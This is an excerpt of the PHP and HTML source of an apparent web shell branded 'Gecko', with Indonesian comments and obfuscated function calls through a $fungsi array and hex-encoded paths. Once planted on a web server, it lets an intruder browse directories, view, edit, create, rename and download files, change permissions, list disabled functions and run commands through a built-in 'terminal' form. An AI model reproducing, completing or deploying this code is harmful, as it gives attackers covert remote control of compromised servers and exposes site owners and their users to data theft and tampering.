...
<body>
        ...
        <div class="main-info">
            ...
            <div class="border-tools">
                <ul class="gecko-tools">
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=read_function"; ?>" class="btn-gecko">-> Unreadble Function</a></li>
                ...
                <?php if (is_dir($Man)) : ?>
                    <form action="" method="post">
                        <tr>
                            ...
                            <td style="text-align:center;"><a href="?path=<?php echo hex($fungsi[1]()) . "&action=rename&ff=" . $Man; ?>"><i class="fa-solid fa-file-pen"></i></a>&nbsp;<a href="?path=<?php echo hex($fungsi[1]()) . "&action=chmod&ff=" . $Man; ?>"><i class="fa-solid fa-user"></i></a></td>
                        </tr>
                    <?php endif; ?>
                <?php endforeach; ?>
                <!-- FILE NYA BANG -->
                <?php foreach ($cariDir as $Man) : ?>
                    <?php if (is_file($Man)) : ?>
                        ...
                        <tr>
                            ...
                            <td style="text-align:center;"><?php $fileowner = posix_getpwuid(fileowner($Man));
                                                            echo $fileowner["name"] . "/" . $fileowner["name"]; ?></td>
                            <td style="text-align:center;"><a href="?path=<?php echo hex($fungsi[1]()) . "&action=rename&ff=" . $Man; ?>"><i class="fa-solid fa-file-pen"></i></a>&nbsp;<a href="?path=<?php echo hex($fungsi[1]()) . "&download=" . $Man; ?>"><i class="fa-solid fa-download"></i></a>&nbsp;<a href="?path=<?php echo hex($fungsi[1]()) . "&action=chmod&file=" . $Man; ?>"><i class="fa-solid fa-user"></i></a></td>
                        </tr>
                    <?php endif; ?>
                <?php endforeach; ?>
        </table>
    ...
    <!-- SCript Here -->
    <script src="https://kit.fontawesome.com/31265a8e29.js" crossorigin="anonymous"></script>
    ...
    if ($_GET['action']  == true) {
        ...
        if ($_GET['action'] == "view" && $_GET['file'] == is_file($_GET['file'])) {
            echo "<textarea class='textarea-gecko' rows='30' disabled>" . htmlspecialchars($fungsi[13]($_GET['file'])) . "</textarea>";
        } else if ($_GET['action'] == "edit" && $_GET['file'] == is_file($_GET['file'])) {
            echo "
            <form method='post'>
            <textarea style='height:550px; width:95%;' class='textarea-gecko' name='text-gecko' cols='30' rows='30'>" . htmlspecialchars($fungsi[13]($_GET['file'])) . "</textarea>
            <br>
            <br>
            ...
            echo '
            <div class="gecko-container-1">
            <div class="gecko-container-2">
            <b>Create Folder !</b>
            <br>
            <br>
            <form method="post">
            <input type="text" name="buatDir" class="buatDir" placeholder="[ Folder Name ]" autofocus>
            ...
            <br>
            <form method="post">
               <input type="text" name="buatFile" class="buatDir" placeholder="[ File Name ]" autofocus>
               <div style="margin-right:50px; float:right;">
               <input type="submit" name="geckoSub" value="Submit" class="submit-gecko">
               </div>
               </form>
            ...
            echo "<b>      " . str_replace(",", "<br>", $show_ds) . "</b>";
        } elseif ($_GET['action'] == "terminal") {
            echo '
            <textarea class="textarea-gecko" cols="30" rows="30" disabled>';
            ...
            <form method="post">
            <label for="terminal-gecko" style="color:lightgreen;">' . get_current_user() . '@terminal : </label><input type="text" name="terminal-gecko" class="buatDir" autofocus>
            ...
            echo '<div class="gecko-container-1">
            <div class="gecko-container-2">
            <b>Rename : ' . htmlspecialchars($_GET['ff']) . '</b>
            <br>
            <br>
            <form method="post">
            <input type="text" name="rename-gecko" class="buatDir" placeholder="[ File Name / Folder ]" autofocus>
               <div style="margin-right:50px; float:right;">
        ...
        } elseif ($_GET['action'] == "chmod" && $_GET['file'] == true) {
            echo '<div class="gecko-container-1">
            <div class="gecko-container-2">
            <b>File Name : ' . htmlspecialchars($_GET['file']) . '</b>
            <br>
            <br>
            <form method="post">
            <input type="number" name="chmod-gecko" class="buatDir" placeholder="775" autofocus>
               <div style="margin-right:50px; float:right;">
               <input type="submit" name="submit-chmod" value="Submit" class="submit-gecko">
               </div>
               </form>
            </div>
            </div>';
    ...
    if (isset($_POST['submit-chmod'])) {
        $angkanya = $_POST['chmod-gecko'];
        $filech = $_GET['file'];
        $chmod = chmod($filech, $angkanya);
        if ($chmod) {
            echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=success"; </script>';
        } else {
            echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=failed"; </script>';
